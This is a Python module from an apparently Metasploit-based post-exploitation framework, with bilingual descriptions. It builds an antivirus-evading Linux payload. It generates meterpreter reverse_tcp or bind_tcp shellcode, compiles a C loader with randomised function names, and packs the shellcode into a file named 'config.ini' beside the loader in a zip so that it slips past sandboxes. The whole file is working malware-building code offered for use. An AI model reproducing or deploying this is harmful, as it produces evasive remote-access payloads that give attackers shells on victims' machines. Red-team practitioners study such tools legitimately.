# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "基础LoaderShellcode分离免杀(Linux)"
    DESC_ZH = "模块通过编码shellcode与基础的shellcodeloader结合的方式实现免杀.通过将shellcode和loader分开为两个文件来绕过沙箱.\n" \
              "模块适配以下类型载荷:\n" \
              "linux/x86/meterpreter/reverse_tcp  linux/x86/meterpreter/bind_tcp\n" \
              "linux/x64/meterpreter/reverse_tcp  linux/x64/meterpreter/bind_tcp"

    NAME_EN = "Basic Loader Shellcode Anti-detection (Linux)"
    DESC_EN = "This module combines encoded shellcode with a basic shellcode loader to achieve anti-detection. By separating the shellcode and loader into two files, it bypasses sandboxes. \n" \
              "The module adapts to the following types of payload:\n" \
              "linux/x86/meterpreter/reverse_tcp  linux/x86/meterpreter/bind_tcp\n" \
              "linux/x64/meterpreter/reverse_tcp  linux/x64/meterpreter/bind_tcp"

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Linux"]  # 平台
    PERMISSIONS = ["User", "Root"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/nadcp7241g046zr4"]
    REFERENCES = ["https://astr0baby.wordpress.com/2019/04/23/metasploit-payloads-evasion-against-linux-av/"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if payload not in ['linux/x86/meterpreter/reverse_tcp', 'linux/x86/meterpreter/bind_tcp',
                           'linux/x64/meterpreter/reverse_tcp', 'linux/x64/meterpreter/bind_tcp', ]:
            return False, "输入的载荷类型不满足要求,请参考模块说明", "The input payload type does not meet the requirements, please refer to the module description"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        FUNCTION1 = self.random_str(8)
        FUNCTION2 = self.random_str(9)

        source_code = self.generate_context_by_template(filename="main.c", FUNCTION1=FUNCTION1, FUNCTION2=FUNCTION2)
        gcc = Gcc(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = gcc.compile_c(arch=arch)
        shellcode_file = "config.ini"
        loader_filename = f"change_name_{int(time.time())}.elf"

        projectfilename = f"LinuxSplitShellcodeLoader_{int(time.time())}.zip"

        self.write_zip_loader_shellcode_project(filename=projectfilename, loader_filename=loader_filename,
                                                loader_data=binbytes,
                                                shellcode_file=shellcode_file,
                                                shellcode_data=shellcode)

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}",
                      f"Please check the generated zip file in <Files>: {projectfilename}")
